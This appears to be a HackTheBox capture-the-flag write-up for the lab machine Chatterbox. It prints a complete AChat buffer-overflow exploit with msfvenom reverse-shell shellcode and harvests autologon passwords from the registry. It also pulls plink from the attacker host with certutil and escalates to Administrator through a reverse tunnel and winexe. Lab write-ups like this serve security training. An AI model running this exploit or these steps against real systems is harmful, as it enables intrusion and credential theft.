<head>
   <link rel="stylesheet" href="css/retro.css">
</head>

## HTB-Chatterbox (10.10.10.74)

----
### Summary

![Chatterbox](../images/chatterbox.png)

I relied on the course hints pretty heavily to capture the CTF. The additional resources below were of great help.

Additonal resources/reading:
* [Privilige Escalation Windows - Sushant ](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
* [Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
* [Reverse Shell Explained](https://www.sans.edu/student-files/presentations/LVReverseShell.pdf)

---
### Scanning/Enumeration
---

#### nmap 
```
nmap -T4 -A -p- 10.01.01.74
alexp@nostromo hacker % sudo nmap -T4 -A -p- 10.10.10.74
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-06 16:52 MDT
Nmap scan report for 10.10.10.74
Host is up (0.065s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE    VERSION
9255/tcp open  tcpwrapped
9256/tcp open  tcpwrapped
9256/tcp open  achat   AChat chat system
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 9255/tcp)
HOP RTT      ADDRESS
1   76.67 ms 10.10.14.1
2   76.70 ms 10.10.10.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3992.60 seconds
```
---
---

This looks interesting...
```
9256/tcp open  achat   AChat chat system
```
A searchsploit search result returns the following...
```
Achat 0.150 beta7 - Remote Buffer Overflow               | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)  | windows/remote/36056.rb
```

I grabbed and modified the 36025.py script...

1. Generate a new msfvenom payload

```
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.41 LPORT=4445 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```
2. Copy the new payload output into the scripts
```
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x39\x6c\x68\x68\x74\x42"
buf += b"\x49\x70\x39\x70\x79\x70\x4f\x70\x52\x69\x39\x55\x6e"
buf += b"\x51\x49\x30\x33\x34\x32\x6b\x72\x30\x50\x30\x54\x4b"
buf += b"\x6e\x72\x4a\x6c\x52\x6b\x62\x32\x4e\x34\x44\x4b\x43"
buf += b"\x42\x4c\x68\x5a\x6f\x47\x47\x6d\x7a\x4e\x46\x6d\x61"
buf += b"\x39\x6f\x36\x4c\x6d\x6c\x50\x61\x53\x4c\x4b\x52\x6c"
buf += b"\x6c\x4f\x30\x39\x31\x58\x4f\x6c\x4d\x7a\x61\x67\x57"
buf += b"\x58\x62\x7a\x52\x72\x32\x61\x47\x52\x6b\x62\x32\x7a"
buf += b"\x70\x34\x4b\x6d\x7a\x6d\x6c\x52\x6b\x4e\x6c\x6c\x51"
buf += b"\x42\x58\x4b\x33\x6e\x68\x59\x71\x36\x71\x70\x51\x34"
buf += b"\x4b\x30\x59\x4f\x30\x6b\x51\x56\x73\x34\x4b\x4e\x69"
buf += b"\x4c\x58\x4a\x43\x6f\x4a\x6f\x59\x52\x6b\x6d\x64\x32"
buf += b"\x6b\x39\x71\x77\x66\x4e\x51\x49\x6f\x54\x6c\x36\x61"
buf += b"\x66\x6f\x4a\x6d\x6a\x61\x77\x57\x4c\x78\x77\x70\x54"
buf += b"\x35\x6b\x46\x69\x73\x61\x6d\x7a\x58\x4f\x4b\x61\x6d"
buf += b"\x4d\x54\x64\x35\x5a\x44\x51\x48\x44\x4b\x61\x48\x6c"
buf += b"\x64\x39\x71\x77\x63\x43\x36\x64\x4b\x4c\x4c\x70\x4b"
buf += b"\x62\x6b\x6f\x68\x6d\x4c\x69\x71\x38\x53\x32\x6b\x4d"
buf += b"\x34\x32\x6b\x7a\x61\x66\x70\x31\x79\x31\x34\x6c\x64"
buf += b"\x4d\x54\x71\x4b\x4f\x6b\x70\x61\x30\x59\x4f\x6a\x30"
buf += b"\x51\x4b\x4f\x67\x70\x31\x4f\x51\x4f\x4f\x6a\x32\x6b"
buf += b"\x4d\x42\x6a\x4b\x74\x4d\x4f\x6d\x71\x58\x4d\x63\x4f"
buf += b"\x42\x69\x70\x6d\x30\x31\x58\x31\x67\x32\x53\x4f\x42"
buf += b"\x61\x4f\x4f\x64\x71\x58\x6e\x6c\x53\x47\x6b\x76\x6a"
buf += b"\x67\x32\x69\x48\x68\x39\x6f\x56\x70\x47\x48\x56\x30"
buf += b"\x4a\x61\x4d\x30\x6b\x50\x6d\x59\x45\x74\x71\x44\x6e"
buf += b"\x70\x31\x58\x4b\x79\x55\x30\x62\x4b\x6b\x50\x79\x6f"
buf += b"\x76\x75\x50\x6a\x7a\x6a\x31\x58\x6b\x5a\x69\x7a\x4c"
buf += b"\x4e\x49\x79\x52\x48\x49\x72\x49\x70\x6c\x51\x31\x4c"
buf += b"\x51\x79\x67\x76\x62\x30\x42\x30\x62\x30\x62\x30\x4d"
buf += b"\x70\x52\x30\x6f\x50\x70\x50\x61\x58\x48\x6a\x7a\x6f"
buf += b"\x37\x6f\x79\x50\x79\x6f\x68\x55\x45\x47\x30\x6a\x5a"
buf += b"\x70\x70\x56\x72\x37\x4f\x78\x42\x79\x35\x55\x61\x64"
buf += b"\x70\x61\x69\x6f\x6a\x35\x75\x35\x79\x30\x33\x44\x69"
buf += b"\x7a\x6b\x4f\x4e\x6e\x39\x78\x33\x45\x6a\x4c\x4a\x48"
buf += b"\x32\x47\x4d\x30\x4d\x30\x69\x70\x30\x6a\x59\x70\x72"
buf += b"\x4a\x4b\x54\x30\x56\x50\x57\x30\x68\x39\x72\x67\x69"
buf += b"\x48\x48\x61\x4f\x4b\x4f\x56\x75\x61\x73\x6b\x48\x59"
buf += b"\x70\x33\x4e\x6c\x76\x62\x6b\x6f\x46\x42\x4a\x61\x30"
buf += b"\x51\x58\x4d\x30\x6c\x50\x49\x70\x4d\x30\x62\x36\x30"
buf += b"\x6a\x49\x70\x43\x38\x6f\x68\x56\x44\x51\x43\x4b\x35"
buf += b"\x4b\x4f\x68\x55\x64\x53\x4f\x63\x70\x6a\x69\x70\x30"
buf += b"\x56\x71\x43\x71\x47\x42\x48\x5a\x62\x68\x59\x39\x38"
buf += b"\x71\x4f\x49\x6f\x4a\x35\x63\x53\x6c\x38\x39\x70\x63"
buf += b"\x4d\x4d\x58\x52\x38\x30\x68\x59\x70\x4f\x50\x79\x70"
buf += b"\x59\x70\x61\x5a\x79\x70\x6e\x70\x72\x48\x4c\x4b\x6e"
buf += b"\x4f\x4a\x6f\x30\x30\x4b\x4f\x58\x55\x70\x57\x71\x58"
buf += b"\x34\x35\x32\x4e\x30\x4d\x73\x31\x6b\x4f\x49\x45\x6f"
buf += b"\x6e\x4f\x6e\x39\x6f\x4a\x6c\x4b\x74\x6c\x4f\x61\x75"
buf += b"\x44\x30\x39\x6f\x59\x6f\x39\x6f\x67\x79\x43\x6b\x6b"
buf += b"\x4f\x4b\x4f\x6b\x4f\x4d\x31\x57\x53\x6f\x39\x39\x36"
buf += b"\x74\x35\x45\x71\x48\x43\x75\x6b\x68\x70\x57\x45\x53"
buf += b"\x72\x50\x56\x31\x5a\x6d\x30\x6f\x63\x69\x6f\x57\x65"
buf += b"\x41\x41"
```
3. Update the server address 
```
server_address = ('10.10.10.74', 9256)
```
4. The revised script
```
#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# Revised msfvenom payload
#msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.41 LPORT=4445 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python


# Revised payload
# Final size of python file: 3936 bytes

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x49\x58\x71\x72"
buf += b"\x79\x70\x4b\x50\x59\x70\x53\x30\x64\x49\x5a\x45\x30"
buf += b"\x31\x37\x50\x52\x44\x44\x4b\x32\x30\x6c\x70\x32\x6b"
buf += b"\x30\x52\x6c\x4c\x42\x6b\x71\x42\x4d\x44\x62\x6b\x74"
buf += b"\x32\x4f\x38\x6a\x6f\x36\x57\x4d\x7a\x4f\x36\x4d\x61"
buf += b"\x6b\x4f\x36\x4c\x4f\x4c\x61\x51\x51\x6c\x4d\x32\x4c"
buf += b"\x6c\x6b\x70\x65\x71\x48\x4f\x7a\x6d\x39\x71\x67\x57"
buf += b"\x5a\x42\x79\x62\x70\x52\x30\x57\x34\x4b\x6f\x62\x6a"
buf += b"\x70\x32\x6b\x6d\x7a\x6f\x4c\x32\x6b\x6e\x6c\x4e\x31"
buf += b"\x44\x38\x57\x73\x4f\x58\x4d\x31\x47\x61\x42\x31\x74"
buf += b"\x4b\x52\x39\x6d\x50\x4b\x51\x77\x63\x72\x6b\x6f\x59"
buf += b"\x4a\x78\x6a\x43\x6f\x4a\x6d\x79\x64\x4b\x70\x34\x52"
buf += b"\x6b\x6d\x31\x37\x66\x4e\x51\x49\x6f\x66\x4c\x77\x51"
buf += b"\x48\x4f\x4a\x6d\x4b\x51\x67\x57\x50\x38\x39\x50\x44"
buf += b"\x35\x58\x76\x4d\x33\x53\x4d\x38\x78\x6f\x4b\x43\x4d"
buf += b"\x4f\x34\x51\x65\x37\x74\x30\x58\x44\x4b\x72\x38\x6e"
buf += b"\x44\x5a\x61\x36\x73\x63\x36\x74\x4b\x4a\x6c\x70\x4b"
buf += b"\x44\x4b\x71\x48\x4d\x4c\x4a\x61\x46\x73\x52\x6b\x69"
buf += b"\x74\x32\x6b\x49\x71\x56\x70\x55\x39\x6e\x64\x4f\x34"
buf += b"\x4c\x64\x71\x4b\x6f\x6b\x71\x51\x61\x49\x4e\x7a\x6f"
buf += b"\x61\x6b\x4f\x57\x70\x71\x4f\x51\x4f\x70\x5a\x54\x4b"
buf += b"\x5a\x72\x38\x6b\x74\x4d\x51\x4d\x51\x58\x6e\x53\x4c"
buf += b"\x72\x39\x70\x39\x70\x73\x38\x42\x57\x44\x33\x4f\x42"
buf += b"\x4f\x6f\x32\x34\x43\x38\x70\x4c\x34\x37\x6c\x66\x5a"
buf += b"\x67\x33\x59\x6a\x48\x59\x6f\x76\x70\x47\x48\x46\x30"
buf += b"\x6d\x31\x4b\x50\x4b\x50\x4b\x79\x47\x54\x32\x34\x30"
buf += b"\x50\x4f\x78\x6e\x49\x73\x50\x50\x6b\x6d\x30\x4b\x4f"
buf += b"\x4a\x35\x71\x5a\x49\x7a\x53\x38\x39\x7a\x6c\x4a\x4a"
buf += b"\x6e\x4f\x39\x6f\x78\x6d\x32\x39\x70\x6c\x51\x4f\x6d"
buf += b"\x63\x59\x39\x56\x4e\x70\x6e\x70\x62\x30\x42\x30\x51"
buf += b"\x30\x4e\x70\x71\x30\x50\x50\x42\x48\x37\x7a\x6a\x6f"
buf += b"\x77\x6f\x69\x50\x49\x6f\x36\x75\x43\x67\x52\x4a\x6c"
buf += b"\x50\x50\x56\x4e\x77\x50\x68\x32\x79\x63\x75\x70\x74"
buf += b"\x50\x61\x49\x6f\x36\x75\x43\x55\x45\x70\x54\x34\x59"
buf += b"\x7a\x6b\x4f\x70\x4e\x6d\x38\x31\x65\x4a\x4c\x49\x58"
buf += b"\x42\x47\x6b\x50\x6b\x50\x49\x70\x4f\x7a\x79\x70\x62"
buf += b"\x4a\x6d\x34\x6e\x76\x72\x37\x62\x48\x49\x72\x68\x59"
buf += b"\x67\x58\x71\x4f\x69\x6f\x6a\x35\x31\x73\x6b\x48\x49"
buf += b"\x70\x63\x4e\x4f\x46\x54\x4b\x6f\x46\x51\x5a\x4d\x70"
buf += b"\x71\x58\x4d\x30\x5a\x70\x4b\x50\x49\x70\x31\x46\x71"
buf += b"\x5a\x39\x70\x33\x38\x50\x58\x47\x34\x61\x43\x6a\x45"
buf += b"\x6b\x4f\x66\x75\x62\x73\x6e\x73\x52\x4a\x6d\x30\x61"
buf += b"\x46\x51\x43\x71\x47\x71\x58\x5a\x62\x7a\x39\x56\x68"
buf += b"\x6f\x6f\x6b\x4f\x5a\x35\x64\x43\x49\x68\x4b\x50\x63"
buf += b"\x4d\x6d\x58\x70\x58\x63\x38\x69\x70\x6d\x70\x4d\x30"
buf += b"\x4b\x50\x32\x4a\x4b\x50\x30\x50\x42\x48\x4a\x6b\x4e"
buf += b"\x4f\x6c\x4f\x50\x30\x4b\x4f\x77\x65\x42\x37\x72\x48"
buf += b"\x72\x55\x72\x4e\x50\x4d\x33\x31\x39\x6f\x67\x65\x4f"
buf += b"\x6e\x61\x4e\x49\x6f\x5a\x6c\x4c\x64\x7a\x6f\x55\x35"
buf += b"\x64\x30\x4b\x4f\x49\x6f\x79\x6f\x6b\x39\x45\x4b\x69"
buf += b"\x6f\x39\x6f\x59\x6f\x4a\x61\x46\x63\x4f\x39\x68\x46"
buf += b"\x64\x35\x77\x51\x79\x33\x77\x4b\x48\x70\x47\x45\x77"
buf += b"\x32\x32\x36\x72\x4a\x59\x70\x6f\x63\x79\x6f\x67\x65"
buf += b"\x41\x41"


# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40"
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()

```
5. Open a meterpreter shell

```
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.9       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

6. Execute the script
```
python 36025.py 
```

 We're connected. Note that if the script doesn't run correctly the first time you may have to reboot the server and repeat. This has taken me several retries.
```
C:\Windows\system32>whoami
whoami
chatterbox\alfred

C:\Windows\system32>systeminfo
systeminfo

Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00371-223-0897461-86794
Original Install Date:     12/10/2017, 9:18:19 AM
System Boot Time:          5/11/2020, 12:59:47 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,502 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,417 MB
Virtual Memory: In Use:    678 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CHATTERBOX
Hotfix(s):                 208 Hotfix(s) Installed.
```

---
### Privilege Escalation
---
There are a couple of connections that did not show up previously on 0.0.0.0:445 (SMB). This could be a potential vector of attack.

```
C:\Windows\system32>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       732
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       396
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       780
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       940
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       452
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       504
  TCP    10.10.10.74:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.74:9255       0.0.0.0:0              LISTENING       3308
  TCP    10.10.10.74:9256       0.0.0.0:0              LISTENING       3308
  TCP    10.10.10.74:49157      10.10.14.9:4444        ESTABLISHED     3308
  TCP    [::]:135               [::]:0                 LISTENING       732
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       396
  TCP    [::]:49153             [::]:0                 LISTENING       780
  TCP    [::]:49154             [::]:0                 LISTENING       940
  TCP    [::]:49155             [::]:0                 LISTENING       452
  TCP    [::]:49156             [::]:0                 LISTENING       504
  UDP    0.0.0.0:123            *:*                                    908
  UDP    0.0.0.0:500            *:*                                    940
  UDP    0.0.0.0:4500           *:*                                    940
  UDP    0.0.0.0:5355           *:*                                    1196
  UDP    0.0.0.0:63710          *:*                                    1196
  UDP    10.10.10.74:137        *:*                                    4
  UDP    10.10.10.74:138        *:*                                    4
  UDP    10.10.10.74:1900       *:*                                    1968
  UDP    10.10.10.74:9256       *:*                                    3308
  UDP    127.0.0.1:1900         *:*                                    1968
  UDP    127.0.0.1:61903        *:*                                    1968
  UDP    [::]:123               *:*                                    908
  UDP    [::]:500               *:*                                    940
  UDP    [::]:4500              *:*                                    940
  UDP    [::1]:1900             *:*                                    1968
  UDP    [::1]:61902            *:*                                    1968
```

Let's search for passwords. I found the following after some enumeration...
```
C:\Windows\system32>reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s

...
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Welcome1!
...

```
Digging a little deeper we get "Alfred" and "Welcome1!"
```
C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x2b
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
```
The plan is to create a reverse shell using plink and then run winexe to escalate priviliges:
1. Download the latest plink  32-bit exe (https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
2. Create a local ftp server on the attacker system (sudo python -m SimpleHTTPServer 80)
3. Upload the plink executable on the target system (certutil -urlcache -f http://10.10.14.9:8000/plink.exe plink.exe )

```
C:\Users\Alfred\Documents>certutil -urlcache -f http://10.10.14.9:8000/plink.exe plink.exe        
certutil -urlcache -f http://10.10.14.9:8000/plink.exe plink.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\Alfred\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of C:\Users\Alfred\Documents

05/11/2020  03:30 PM    <DIR>          .
05/11/2020  03:30 PM    <DIR>          ..
05/11/2020  03:30 PM           601,000 plink.exe
               1 File(s)        601,000 bytes
               2 Dir(s)  18,159,943,680 bytes free
```
4. On the target system run: plink.exe -l root -R 445:127.0.0.1:445 10.10.14.9  (you will need to press enter several times)
5. If it all goes well you now have a reverse shell. Next use winexe: winexe -U Administrator%Welcome1 //127.0.0.1 "cmd.exe"
6. if this goes well you have administrator priviliges. Grab the root.txt flag!
